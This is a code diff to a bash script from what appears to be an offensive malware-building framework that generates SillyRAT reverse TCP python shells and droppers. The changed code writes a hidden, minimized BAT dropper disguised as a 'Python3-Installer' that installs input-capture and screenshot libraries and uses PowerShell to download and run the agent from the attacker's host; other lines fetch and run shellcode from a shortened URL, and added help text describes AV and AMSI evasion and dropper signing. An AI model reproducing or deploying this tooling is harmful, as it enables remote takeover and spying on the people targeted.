@@ -3071,8 +3071,7 @@ if [ "$OBF" = "None-Obfuscation (default)" ]; then
 echo "@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp" > $N4m.bat
 else
 echo "[✔] String obfuscation technic sellected .."
-### TODO: check if connects back..
-# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+## OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
 # https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
 #
 # STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp
@@ -10208,6 +10207,7 @@ fi
 
 
 
+
 # ---------------------------------------------------
 # SillyRAT Multi-Platforms (reverse TCP python shell)
 # https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
@@ -10250,12 +10250,12 @@ if [ "$?" -ne "0" ]; then
 fi
 
 ## Check if python3 its installed on attacker machine
-audit=$(python --version > /dev/null 2>&1) > /dev/null 2>&1
+audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
-   echo "" && sudo apt-get update -qq && apt-get install -y python3 && echo ""
+   echo "" && sudo apt-get update -qq && apt-get install -y python python3 && echo ""
 fi
 
 ## Check if 'venomconf' local file exists
@@ -10275,7 +10275,7 @@ fi
 ## Store User Inputs (module bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam-Installer\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Python3-Installer\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
@@ -10285,13 +10285,13 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$SOSP" ]; then SOSP="windows";fi
-if [ -z "$Drop" ]; then Drop="Steam-Installer";fi
+if [ -z "$Drop" ]; then Drop="Python3-Installer";fi
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
    uploadpath="$rpath => (remote)"
    lolbin="Powershell (DownloadFile)"
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
-      dropperpath="$IPATH/output/$Drop.vbs"
+      dropperpath="$IPATH/output/$Drop.bat"
    else
       dropperpath="$IPATH/output/$Drop.exe"
    fi
@@ -10330,19 +10330,22 @@ if [ "$SOSP" = "Windows" ]; then
    # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
    # requirements in target system before executing the Client.py remote.
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
-      ## Build dropper.vbs (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
-      echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
-      echo "' Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.vbs
-      echo "' Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.vbs
-      echo "' Function: Install python3 SillyRAT requirements before downloading" >> $Drop.vbs
-      echo "' and executing $Drop.py (Client reverse tcp python shell) in background." >> $Drop.vbs
-      echo "' ---" >> $Drop.vbs
-      echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $Drop.vbs
-      echo "objShell.Run \"cmd /c powershell \$C=pip show tabulate;If(-not(\$C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}\", 0, True" >> $Drop.vbs
-      echo "x=msgbox(\"none updates available at the moment ..\" & vbCrLf & \"For more info visite https://www.appstore.com\" ,0, \"$Drop 3.10.5-dev-32bit\")" >> $Drop.vbs
-      echo "objShell.Run \"cmd /c powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py\", 0, True" >> $Drop.vbs
-      echo "${BlueF}[☠]${white} $Drop.vbs written to output."${Reset};sleep 2
+      ## Build dropper.bat (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
+      echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
+      echo ":: Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.bat
+      echo ":: Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.bat
+      echo ":: Function: Install python3 SillyRAT requirements before downloading" >> $Drop.bat
+      echo ":: and executing $Drop.py (reverse tcp python shell) in background." >> $Drop.bat
+      echo ":: ---" >> $Drop.bat
+      echo "@echo off" >> $Drop.bat
+      echo "title $Drop - 3.10.5-dev Windows Installer" >> $Drop.bat
+      echo "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" >> $Drop.bat
+      echo "powershell \$C=pip show tabulate;If(-not(\$C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}" >> $Drop.bat
+      echo "powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py" >> $Drop.bat
+      echo "${BlueF}[☠]${white} $Drop.bat written to output."${Reset};sleep 2
+
    else
+
       ## Build dropper.exe [flagged by AV] (default in categorie nº3 - Agent nº5)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
       cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
@@ -10361,12 +10364,12 @@ if [ "$SOSP" = "Windows" ]; then
 elif [ "$SOSP" = "Linux" ]; then
 
       ## Set Agent (Client.py) execution delay time in seconds (default 40)
-      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 40\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
+      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 40\nThis delay time its required for the dropper to have time to finish\ninstall python3 dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
       if [ -z "$delayTime" ]; then delayTime="40";fi
 
       ## BUILD DROPPER (Install python3/Download/Execute Client.py)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-      echo "${BlueF}[☠]${white} Client.py delay time: $delayTime (sec)"${Reset};
+      echo "${BlueF}[☠]${white} Client.py delayTime: $delayTime (sec)"${Reset};
       echo "#include<stdio.h>" > $Drop.c
       echo "#include<stdlib.h>" >> $Drop.c
       echo "#include<string.h>" >> $Drop.c
@@ -10400,7 +10403,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         We are runing in parent process (child its also running)" >> $Drop.c
       echo "         Function: Install python3 and sillyrat requirements" >> $Drop.c
       echo "         */" >> $Drop.c
-      echo "         printf(\"\\\n$Drop - 3.10.5-dev-32bit Linux Installer\\\n\");" >> $Drop.c
+      echo "         printf(\"\\\n$Drop - 3.10.5-dev Linux Installer\\\n\");" >> $Drop.c
       echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "         /* Display system information onscreen to target user */" >> $Drop.c
       echo "         sleep(1);system(\"c=\$(hostnamectl);echo \\\"\$c\\\"\");" >> $Drop.c
@@ -10450,7 +10453,7 @@ echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};
 if [ "$SOSP" = "Windows" ]; then
 
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
-      zip $Drop.zip $Drop.vbs > /dev/nul 2>&1 # ZIP dropper.vbs
+      zip $Drop.zip $Drop.bat > /dev/nul 2>&1 # ZIP dropper.bat
       cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
       mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
    else
@@ -10509,6 +10512,8 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 rm $IPATH/output/dropper.c > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/server.py > /dev/nul 2>&1
+rm $IPATH/output/Obfuscated.bat > /dev/nul 2>&1
+rm $IPATH/output/vbs-obfuscator.py > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 cd $IPATH
 
@@ -12251,6 +12256,7 @@ exit
 ## -------------------
 sh_ninja () {
 echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};sleep 2
+obfstat=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 cat << !
 
 
@@ -12304,7 +12310,7 @@ cat << !
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
     TARGET SYSTEMS     : Multi-Platforms (Linux|Mac|Windows)
     LOLBin             : Powershell|Wget (DownloadFile)
-    DROPPER EXTENSION  : VBS|NULL
+    DROPPER EXTENSION  : BAT
     AGENT EXTENSION    : PY
     AGENT PERSISTENCE  : NOT AVAILABLE
 
@@ -12315,8 +12321,7 @@ cat << !
 
 
 !
-echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
-sleep 1
+echo ${BlueF}[${YellowF}i${BlueF}] "[${YellowF}help 1${BlueF}]${white}detail info"${Reset};sleep 1
 echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
 read choice
 case $choice in
@@ -12326,10 +12331,117 @@ case $choice in
 4) sh_evasion4 ;;
 5) sh_evasion5 ;;
 6) vbsevasion="ON";sh_shellcode27 ;;
+"help 1") easter1 ;;
+"help 2") easter2 ;;
+"help 3") easter3 ;;
+"help 4") easter4 ;;
+"help 5") easter5 ;;
+"help 6") easter6 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
 esac
+}
+
+
+## TODO: decide if i want this or not
+easter1 () {
+cat << !
+
+    AGENT Nº   : 1
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse TCP Powershell Shell
+    OBFUSCATION: If activated, creates a VBS dropper insted of PS1
+                 This function its used to hidde better the execution
+                 of venom dropper on target machine (silent execution)
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter2 () {
+cat << !
+
+    AGENT Nº   : 2
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse OpenSSL Powershell Shell
+    OBFUSCATION: If activated, 'persistence' creates a VBS insted of BAT
+                 This function its used to hidde better the execution of
+                 venom persistence scripts on target machine (silent exec)
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter3 () {
+cat << !
+
+    AGENT Nº   : 3
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse Powershell Shell (hex obfuscation)
+    OBFUSCATION: If activated, 'persistence' creates a VBS insted of BAT
+                 This function its used to hidde better the execution of
+                 venom persistence scripts on target machine (silent exec)
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter4 () {
+cat << !
+
+    AGENT Nº   : 4
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: meterpeter Reverse PS Shell (ascii|bxor)
+    OBFUSCATION: This module does not support easter eggs (directly!)
+                 But.. meterpeter main script can be edit to activate
+                 the 'obfuscation=on' function that in windows attacker
+                 machine uses PS2EXE.ps1 to compile the PS1 dropper to EXE.
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter5 () {
+cat << !
+
+    AGENT Nº   : 5
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse TCP Shell (PDF Trojan)
+    OBFUSCATION: If activated, dropper.exe its signed for AV evasion.
+                 Using @paranoidninja - CarbonCopy script that signs venom
+                 dropper with one SSL certificate (random domain generation)
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter6 () {
+cat << !
+
+    AGENT Nº   : 6
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse TCP python Shell (SillyRAT)
+    OBFUSCATION: Activated or NOT, creates a BAT dropper (amsi evasion)
+                 The categorie nº3 => agent nº5 that by default creates a EXE
+                 dropper detected by AV soluctions was ported to this categorie
+                 has one BAT dropper that manages to bypass AV/amsi detection.
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
 }
 
 
@@ -13958,7 +14070,7 @@ cat << !
     TARGET SYSTEMS     : Windows|Linux|OSx
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
     LOLBin             : Powershell|Wget (DownloadFile)
-    DROPPER EXTENSION  : EXE|NULL
+    DROPPER EXTENSION  : EXE|BAT (obfuscation)
     AGENT EXTENSION    : PY
 
     ╔═════════════════════════════════════════════════════════════╗
